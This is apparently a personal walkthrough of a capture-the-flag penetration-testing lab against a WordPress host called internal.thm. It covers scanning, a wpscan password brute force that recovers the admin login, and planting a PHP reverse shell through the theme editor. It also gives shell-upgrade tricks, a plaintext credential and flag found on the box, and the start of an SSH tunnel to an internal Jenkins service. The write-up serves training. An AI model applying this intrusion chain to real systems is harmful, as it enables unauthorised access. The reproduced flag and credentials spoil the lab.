# Internal

You are assigned to perform a black‑box penetration test on a virtual environment scheduled for production in three weeks.

The assessment must include:
- External testing
- Web application testing
- Internal network testing

The client provides minimal information to simulate a real attacker.

Your objectives:
- Modify your hosts file to resolve internal.thm
- Use any tools or techniques (full offensive freedom)
- Identify and document all vulnerabilities
- Obtain two proof‑of‑compromise flags:
    - user.txt
    - root.txt

Submit the flags to the dashboard

Only the assigned target IP is in scope.

- You are encouraged to treat this as a real engagement and produce a professional report (exec summary, findings, exploitation steps, remediation). If time permits.

# Start enumeration with NMAP
```
└─$ nmap -Pn -sV -sC THM_Target                     
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 400 Bad Request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
```
- Just 2 services to look at on Linux OS
- Quick browse of ip shows apache web server default screen.

- GoBuster and feroxbuster both done ferox buster far more detailed but gobuster summed it up better more concisely, more scans on wp, it was not necessary to go in more detail here:
```
└─$ sudo gobuster dir -u "http://THM_Target:80" -w /usr/share/wordlists/dirb/common.txt -t 10 --timeout 10s
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://THM_Target:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/blog                 (Status: 301) [Size: 311] [--> http://THM_Target/blog/]                                                                           
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 317] [--> http://THM_Target/javascript/]                                                                     
/phpmyadmin           (Status: 301) [Size: 317] [--> http://THM_Target/phpmyadmin/]                                                                     
/server-status        (Status: 403) [Size: 277]
/wordpress            (Status: 301) [Size: 316] [--> http://THM_Target/wordpress/]
Progress: 4613 / 4613 (100.00%)
===============================================================              
```
On closer inspection with browser there is the internal.thm/blog page with link to login taking us to wp-admin login, and a phpmyadmin login page. A closer look with WPSCAN using:
```
 wpscan --url http://THM_Target:80/blog --enumerate --passwords /usr/share/wordlists/rockyou.txt --output wpscan_enumerated.txt
```
Main findings are the username and password for admin account.

```
...
 [+] [ URL: http://THM_Target/blog/ [THM_Target]
...
Interesting Finding(s):

 [+] [ Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

 [+] [ XML-RPC seems to be enabled: http://THM_Target/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
...
 [+] [ WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
...
 [i] [ User(s) Identified:

 [+] [ admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)


 [!] [ Valid Combinations Found:
 | Username: admin, Password: my2boys
...
```
- Using this user name and password logging into /THM_Target/blog/wp-login.php. 
- Then going to vertical hamburger menu on top right.
- Selecting appearances section.
- Then Theme Editor and Theme Function.
- Next replace the php code with a php reverse shell.
- Start the netcat listener set to port for reverse shell just placed in Theme Function section.
- Select update file on the php code replaced and you should connect reverse shell to listener.

## My mistake I should have considered about the reverse shell:
- I often forget to use the additional steps that make a reverse shell much easier to work with. Without them, you end up dealing with problems like no arrow keys, no command history, no Ctrl+R search, broken backspace, or the shell skipping lines. Using something like rlwrap nc -lnvp 4444 fixes this by adding proper line editing and better copy‑and‑paste behaviour.

- Another issue is that a raw reverse shell is not a TTY. That means no job control, no interactive programs like nano, top, or su, no proper signal handling, and no terminal features. Spawning a PTY — for example with
python3 -c 'import pty; pty.spawn("/bin/bash")' — gives the remote side a pseudo‑terminal, which fixes most of these problems. It prevents Ctrl+C from accidentally closing the shell, allows Ctrl+Z to background the session, restores tab completion and arrow keys, provides a proper prompt instead of blank lines, and enables interactive tools.

- The step that almost always fails for me is the terminal fix after suspending the shell:
stty raw -echo  
This tells the local terminal to stop interpreting characters, pass everything directly to the remote PTY, and avoid echoing characters twice.

```
root@ip-10-48-100-246:~/Desktop# nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.48.175.89 43782
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:51:38 up  1:26,  0 users,  load average: 0.00, 0.07, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ pwd
/
$ cd /home
$ ls
aubreanna
$ cd aubreanna
sh: 6: cd: can't cd to aubreanna
```
Start looking for user.txt file start with location of word press files (not here)
```
$ cd /var/www/html
$ ls
index.html
wordpress
$ ls -la
total 24
drwxr-xr-x 3 root   root     4096 Aug  3  2020 .
drwxr-xr-x 3 root   root     4096 Aug  3  2020 ..
-rw-r--r-- 1 root   root    10918 Aug  3  2020 index.html
drwxr-xr-x 5 nobody nogroup  4096 Aug  3  2020 wordpress
$ cd wordpress
$  ls -la
total 220
drwxr-xr-x  5 nobody nogroup  4096 Aug  3  2020 .
drwxr-xr-x  3 root   root     4096 Aug  3  2020 ..
-rw-r--r--  1 nobody nogroup   405 Feb  6  2020 index.php
-rw-r--r--  1 nobody nogroup 19915 Feb 12  2020 license.txt
-rw-r--r--  1 nobody nogroup  7278 Jan 10  2020 readme.html
-rw-r--r--  1 nobody nogroup  6912 Feb  6  2020 wp-activate.php
drwxr-xr-x  9 nobody nogroup  4096 Jun 10  2020 wp-admin
-rw-r--r--  1 nobody nogroup   351 Feb  6  2020 wp-blog-header.php
-rw-r--r--  1 nobody nogroup  2332 Jun  2  2020 wp-comments-post.php
-rw-r--r--  1 root   root     2899 Aug  3  2020 wp-config-sample.php
-rw-r--r--  1 root   root     3109 Aug  3  2020 wp-config.php
drwxr-xr-x  4 nobody nogroup  4096 Jun 10  2020 wp-content
-rw-r--r--  1 nobody nogroup  3940 Feb  6  2020 wp-cron.php
drwxr-xr-x 21 nobody nogroup 12288 Jun 10  2020 wp-includes
-rw-r--r--  1 nobody nogroup  2496 Feb  6  2020 wp-links-opml.php
-rw-r--r--  1 nobody nogroup  3300 Feb  6  2020 wp-load.php
-rw-r--r--  1 nobody nogroup 47874 Feb 10  2020 wp-login.php
-rw-r--r--  1 nobody nogroup  8509 Apr 14  2020 wp-mail.php
-rw-r--r--  1 nobody nogroup 19396 Apr 10  2020 wp-settings.php
-rw-r--r--  1 nobody nogroup 31111 Feb  6  2020 wp-signup.php
-rw-r--r--  1 nobody nogroup  4755 Feb  6  2020 wp-trackback.php
-rw-r--r--  1 nobody nogroup  3133 Feb  6  2020 xmlrpc.php
$ 
```
Files are often in two locations the wordpress folder listed or developer backup files in /opt directory
```
$ cd /opt
$ ls
containerd
wp-save.txt
$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
drwx--x--x  4 root root 4096 Aug  3  2020 containerd
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
$
$ file containerd
containerd: directory
$ cd containerd
$ ls
ls: cannot open directory '.': Permission denied
```
We now have a user aubreanna which gets us to user.txt via ssh:
```
aubreanna@internal:~$ pwd
/home/aubreanna
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
```
Answer Q1: user.txt flag THM{int3rna1_fl4g_1}

Now lets have a look what else is present:
```
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080

aubreanna@internal:~$ cd snap
aubreanna@internal:~/snap$ ls
docker
aubreanna@internal:~/snap$ cd docker
aubreanna@internal:~/snap/docker$ ls
current
aubreanna@internal:~/snap/docker$ cat current
cat: current: No such file or directory
aubreanna@internal:~/snap/docker$ file current
current: broken symbolic link to 471
aubreanna@internal:~/snap/docker$ current
current: command not found
aubreanna@internal:~/snap/docker$ ls -la current
lrwxrwxrwx 1 aubreanna aubreanna 3 Aug  3  2020 current -> 471
aubreanna@internal:~/snap/docker$ 
```
Here the txt file jenkins is useful for escalation, this require using ssh to with a local port forward by connection to aubreanna again on THM_Target IP. By opening port 8080 on my local machine and forward SSH tunnel to 172.17.0.2:8080 from aubreanna remote host.

YOUR_IP:8080  →  THM_TargetP_IP (SSH server as aubreanna)  →  172.17.0.2:8080

This creates a listener on YOUR_IP 127.0.0.1:8080 forwards traffic via encrypted SSH connection to the 172.17.0.2:8080 much the same way used to connect VNC connection via secure SSH connection.
